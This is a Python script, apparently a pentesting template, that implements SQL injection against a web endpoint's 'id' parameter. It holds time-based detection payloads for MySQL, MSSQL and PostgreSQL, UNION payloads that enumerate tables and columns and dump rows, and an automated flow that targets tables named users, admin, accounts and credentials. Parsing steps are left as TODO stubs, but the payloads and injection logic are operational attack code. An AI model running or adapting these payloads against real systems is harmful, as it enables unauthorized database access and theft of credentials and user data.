#!/usr/bin/env python3
"""
SQL Injection Exploit Template
Target: [Application/Endpoint]
Vulnerability: [Vuln Type - Union/Blind/Error-based]
Author: [Your Name]
Date: [Date]
Authorization: [Reference]

Usage:
    python3 sqli-template.py <target_url> [options]

Options:
    --check         Verify target is vulnerable (safe)
    --dump-tables   Extract table names
    --dump-data     Extract data from specified table
    --dry-run       Show what would be done without executing
"""

import argparse
import requests
import sys
import urllib.parse
from typing import Optional, List, Dict
import time


class SQLiExploit:
    """SQL Injection Exploit Class"""

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Research)',
        })

    def log(self, message: str) -> None:
        """Print verbose output"""
        if self.verbose:
            print(f"[*] {message}")

    def check(self) -> bool:
        """
        Verify target is vulnerable (safe check)
        Uses time-based detection to avoid data modification
        """
        print("[*] Checking if target is vulnerable...")

        # Time-based detection payloads
        payloads = [
            "' AND SLEEP(3)-- -",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",
            "'; WAITFOR DELAY '0:0:3'-- -",
            "' AND pg_sleep(3)-- -",
        ]

        for payload in payloads:
            try:
                start = time.time()
                self._inject(payload)
                elapsed = time.time() - start

                if elapsed >= 2.5:
                    print(f"[+] Target appears vulnerable! (Response time: {elapsed:.2f}s)")
                    return True
            except Exception as e:
                self.log(f"Payload failed: {e}")
                continue

        print("[-] Target does not appear vulnerable to time-based SQLi")
        return False

    def _inject(self, payload: str) -> requests.Response:
        """
        Inject payload into vulnerable parameter
        Modify this method based on injection point
        """
        # TODO: Customize for your target
        # Example: GET parameter injection
        params = {
            'id': payload,  # Vulnerable parameter
        }

        response = self.session.get(
            f"{self.target}/vulnerable/endpoint",
            params=params,
            timeout=10
        )
        return response

    def dump_tables(self) -> List[str]:
        """Extract table names from database"""
        print("[*] Extracting table names...")
        tables = []

        # Union-based table extraction (MySQL example)
        # Modify for your database type
        payload = "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -"

        try:
            response = self._inject(payload)
            # TODO: Parse table names from response
            # tables = self._parse_tables(response.text)
            pass
        except Exception as e:
            print(f"[-] Error extracting tables: {e}")

        return tables

    def dump_columns(self, table_name: str) -> List[str]:
        """Extract column names from specified table"""
        print(f"[*] Extracting columns from {table_name}...")
        columns = []

        payload = f"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{table_name}'-- -"

        try:
            response = self._inject(payload)
            # TODO: Parse column names from response
            pass
        except Exception as e:
            print(f"[-] Error extracting columns: {e}")

        return columns

    def dump_data(self, table: str, columns: List[str], limit: int = 10) -> List[Dict]:
        """Extract data from specified table and columns"""
        print(f"[*] Extracting data from {table}...")
        data = []

        cols = ','.join(columns)
        payload = f"' UNION SELECT {cols} FROM {table} LIMIT {limit}-- -"

        try:
            response = self._inject(payload)
            # TODO: Parse data from response
            pass
        except Exception as e:
            print(f"[-] Error extracting data: {e}")

        return data

    def exploit(self) -> bool:
        """
        Main exploitation flow
        """
        print("[*] Starting SQL injection exploitation...")

        # Step 1: Verify vulnerability
        if not self.check():
            print("[-] Exploitation aborted - target not confirmed vulnerable")
            return False

        # Step 2: Extract tables
        tables = self.dump_tables()
        if tables:
            print(f"[+] Found {len(tables)} tables")
            for t in tables:
                print(f"    - {t}")

        # Step 3: Extract data from interesting tables
        interesting_tables = ['users', 'admin', 'accounts', 'credentials']
        for table in tables:
            if any(t in table.lower() for t in interesting_tables):
                columns = self.dump_columns(table)
                if columns:
                    data = self.dump_data(table, columns)
                    print(f"[+] Extracted {len(data)} rows from {table}")

        return True


def main():
    parser = argparse.ArgumentParser(
        description='SQL Injection Exploit - Security Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    %(prog)s https://target.com --check
    %(prog)s https://target.com --dump-tables
    %(prog)s https://target.com --dump-data --table users
        """
    )

    parser.add_argument('target', help='Target URL')
    parser.add_argument('--check', action='store_true',
                        help='Check if target is vulnerable (safe)')
    parser.add_argument('--dump-tables', action='store_true',
                        help='Extract database table names')
    parser.add_argument('--dump-data', action='store_true',
                        help='Extract data from database')
    parser.add_argument('--table', help='Specify table for data extraction')
    parser.add_argument('--dry-run', action='store_true',
                        help='Show actions without executing')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    if args.dry_run:
        print("[DRY RUN] Would execute against:", args.target)
        print("[DRY RUN] Actions:", end=' ')
        if args.check: print("check", end=' ')
        if args.dump_tables: print("dump-tables", end=' ')
        if args.dump_data: print("dump-data", end=' ')
        print()
        return 0

    exploit = SQLiExploit(args.target, verbose=args.verbose)

    if args.check:
        return 0 if exploit.check() else 1
    elif args.dump_tables:
        tables = exploit.dump_tables()
        return 0 if tables else 1
    elif args.dump_data:
        if not args.table:
            print("[-] Please specify --table for data extraction")
            return 1
        data = exploit.dump_data(args.table, ['*'])
        return 0 if data else 1
    else:
        return 0 if exploit.exploit() else 1


if __name__ == '__main__':
    sys.exit(main())
